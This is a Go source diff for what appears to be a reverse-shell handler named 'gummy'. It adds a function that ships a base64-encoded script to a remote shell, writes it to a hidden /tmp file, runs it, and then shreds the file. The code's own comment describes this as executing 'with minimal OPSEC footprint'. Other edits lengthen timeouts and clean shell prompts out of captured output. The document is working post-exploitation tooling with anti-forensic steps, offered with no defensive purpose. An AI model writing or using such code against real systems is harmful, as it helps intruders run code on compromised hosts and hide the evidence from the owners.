@@ -1,6 +1,7 @@
 package internal
 
 import (
+	"encoding/base64"
 	"fmt"
 	"io"
 	"net"
@@ -418,7 +419,7 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 
 	// Send command with a unique marker at the end
 	marker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())
-	fullCmd := fmt.Sprintf("%s; echo '%s'\n", cmd, marker)
+	fullCmd := fmt.Sprintf("%s\necho '%s'\n", cmd, marker)
 
 	_, err = h.conn.Write([]byte(fullCmd))
 	if err != nil {
@@ -428,7 +429,7 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 	// Read output in real-time until we see the marker
 	buffer := make([]byte, 4096)
 	var accumulated strings.Builder
-	h.conn.SetReadDeadline(time.Now().Add(5 * time.Minute)) // Max 5 minutes for script
+	h.conn.SetReadDeadline(time.Now().Add(10 * time.Minute)) // Max 10 minutes for script
 
 	for {
 		n, err := h.conn.Read(buffer)
@@ -436,8 +437,8 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 			if err == io.EOF {
 				break
 			}
-			// Check if it's just a timeout with accumulated data
-			if accumulated.Len() > 0 && strings.Contains(accumulated.String(), marker) {
+			// Check if it's just a timeout but we already got the marker
+			if strings.Contains(accumulated.String(), marker) {
 				break
 			}
 			return fmt.Errorf("read error: %w", err)
@@ -453,6 +454,145 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 
 			// Check if we've received the completion marker
 			if strings.Contains(accumulated.String(), marker) {
+				// Remove deadline immediately to avoid timeout errors
+				h.conn.SetReadDeadline(time.Time{})
+				break
+			}
+		}
+	}
+
+	// Ensure deadline is cleared
+	h.conn.SetReadDeadline(time.Time{})
+
+	// Clean the output file from shell noise
+	finalContent := accumulated.String()
+
+	// Find where marker appears
+	markerIndex := strings.Index(finalContent, marker)
+	if markerIndex != -1 {
+		finalContent = finalContent[:markerIndex]
+	}
+
+	// Split into lines for cleaning
+	lines := strings.Split(finalContent, "\n")
+
+	// Find first line that looks like actual script output
+	// Skip: command echoes, chmod, prompts [user@host ~]$
+	startIdx := 0
+	for i, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		// Skip empty lines
+		if trimmed == "" {
+			continue
+		}
+		// Skip command echoes (contains the actual command we sent)
+		if strings.Contains(line, "chmod") || strings.Contains(line, "bash /tmp/") {
+			continue
+		}
+		// Skip shell prompts
+		if strings.Contains(line, "@") && (strings.Contains(line, "$") || strings.Contains(line, "#")) {
+			continue
+		}
+		// Skip the marker echo command itself
+		if strings.Contains(line, "echo") && strings.Contains(line, "GUMMY") {
+			continue
+		}
+		// Found first real output line
+		startIdx = i
+		break
+	}
+
+	// Find last line that's actual output (remove trailing prompts)
+	endIdx := len(lines) - 1
+	for i := len(lines) - 1; i >= 0; i-- {
+		trimmed := strings.TrimSpace(lines[i])
+		// Skip empty lines at end
+		if trimmed == "" {
+			continue
+		}
+		// Skip trailing prompts
+		if strings.Contains(lines[i], "@") && (strings.Contains(lines[i], "$") || strings.Contains(lines[i], "#")) {
+			continue
+		}
+		// Found last real line
+		endIdx = i
+		break
+	}
+
+	// Extract clean content
+	var cleanContent string
+	if startIdx <= endIdx {
+		cleanContent = strings.Join(lines[startIdx:endIdx+1], "\n")
+	}
+
+	// Rewrite file with clean content
+	localFile.Seek(0, 0)
+	localFile.Truncate(0)
+	if cleanContent != "" {
+		localFile.WriteString(cleanContent)
+		if !strings.HasSuffix(cleanContent, "\n") {
+			localFile.WriteString("\n")
+		}
+	}
+	localFile.Sync()
+
+	return nil
+}
+
+// ExecuteScriptFromStdin executes script with minimal OPSEC footprint
+// Uses /tmp/ briefly (file exists for ~seconds), but gives clean output
+func (h *Handler) ExecuteScriptFromStdin(interpreter, args string, scriptData []byte, localOutputPath string) error {
+	// Create local output file
+	localFile, err := os.Create(localOutputPath)
+	if err != nil {
+		return fmt.Errorf("failed to create local file: %w", err)
+	}
+	defer localFile.Close()
+
+	// Use /tmp/ with hidden filename
+	tempFile := fmt.Sprintf("/tmp/.gummy_%d", time.Now().UnixNano())
+	doneMarker := fmt.Sprintf("__GUMMY_DONE_%d__", time.Now().UnixNano())
+
+	// Base64 encode to avoid any escaping issues
+	scriptB64 := base64.StdEncoding.EncodeToString(scriptData)
+
+	// Single line: decode to temp, execute, shred/delete
+	// This is clean, works reliably, and file exists briefly
+	fullCmd := fmt.Sprintf("echo %s|base64 -d>%s;%s %s%s;shred -uz %s 2>/dev/null||rm -f %s;echo %s\n",
+		scriptB64, tempFile, interpreter, tempFile, args, tempFile, tempFile, doneMarker)
+
+	_, err = h.conn.Write([]byte(fullCmd))
+	if err != nil {
+		return fmt.Errorf("failed to send command: %w", err)
+	}
+
+	// Read output in real-time until done marker
+	buffer := make([]byte, 4096)
+	var accumulated strings.Builder
+	h.conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
+
+	for {
+		n, err := h.conn.Read(buffer)
+		if err != nil {
+			if err == io.EOF {
+				break
+			}
+			if accumulated.Len() > 0 && strings.Contains(accumulated.String(), doneMarker) {
+				break
+			}
+			return fmt.Errorf("read error: %w", err)
+		}
+
+		if n > 0 {
+			chunk := string(buffer[:n])
+			accumulated.WriteString(chunk)
+
+			// Write to local file immediately
+			localFile.WriteString(chunk)
+			localFile.Sync()
+
+			// Check for done marker
+			if strings.Contains(accumulated.String(), doneMarker) {
 				break
 			}
 		}
@@ -460,22 +600,73 @@ func (h *Handler) ExecuteWithStreaming(cmd, localOutputPath string) error {
 
 	h.conn.SetReadDeadline(time.Time{})
 
-	// Remove the marker from the output file
+	// Clean output (remove done marker and shell noise)
 	finalContent := accumulated.String()
-	markerIndex := strings.Index(finalContent, marker)
+
+	// Remove done marker
+	markerIndex := strings.Index(finalContent, doneMarker)
 	if markerIndex != -1 {
-		// Rewrite file without the marker
-		localFile.Seek(0, 0)
-		localFile.Truncate(0)
-		cleanContent := finalContent[:markerIndex]
-		// Also remove the command echo if present (first line might be the command)
-		lines := strings.Split(cleanContent, "\n")
-		if len(lines) > 1 && strings.Contains(lines[0], cmd) {
-			cleanContent = strings.Join(lines[1:], "\n")
-		}
-		localFile.WriteString(cleanContent)
-		localFile.Sync()
+		finalContent = finalContent[:markerIndex]
 	}
+
+	// Split and clean lines
+	lines := strings.Split(finalContent, "\n")
+
+	// Skip initial noise (printf command, prompts, etc.)
+	startIdx := 0
+	for i, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		// Skip printf command echo
+		if strings.Contains(line, "printf") && strings.Contains(line, interpreter) {
+			continue
+		}
+		// Skip interpreter invocation
+		if strings.Contains(line, interpreter) && strings.Contains(line, "-s") {
+			continue
+		}
+		// Skip prompts
+		if strings.Contains(line, "@") && (strings.Contains(line, "$") || strings.Contains(line, "#")) {
+			continue
+		}
+		// Found first real line
+		startIdx = i
+		break
+	}
+
+	// Skip trailing noise
+	endIdx := len(lines) - 1
+	for i := len(lines) - 1; i >= 0; i-- {
+		trimmed := strings.TrimSpace(lines[i])
+		if trimmed == "" {
+			continue
+		}
+		// Skip trailing prompts
+		if strings.Contains(lines[i], "@") && (strings.Contains(lines[i], "$") || strings.Contains(lines[i], "#")) {
+			continue
+		}
+		endIdx = i
+		break
+	}
+
+	// Extract clean content
+	var cleanContent string
+	if startIdx <= endIdx {
+		cleanContent = strings.Join(lines[startIdx:endIdx+1], "\n")
+	}
+
+	// Rewrite file with clean content
+	localFile.Seek(0, 0)
+	localFile.Truncate(0)
+	if cleanContent != "" {
+		localFile.WriteString(cleanContent)
+		if !strings.HasSuffix(cleanContent, "\n") {
+			localFile.WriteString("\n")
+		}
+	}
+	localFile.Sync()
 
 	return nil
 }
